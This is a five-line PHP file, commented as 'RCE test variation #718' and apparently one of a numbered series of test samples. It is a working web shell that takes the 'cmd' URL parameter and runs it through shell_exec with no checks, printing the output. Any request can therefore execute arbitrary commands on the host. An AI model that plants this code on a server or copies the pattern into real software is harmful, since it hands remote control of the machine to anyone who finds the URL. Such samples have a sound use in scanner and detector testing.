<?php
// RCE test variation #718
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>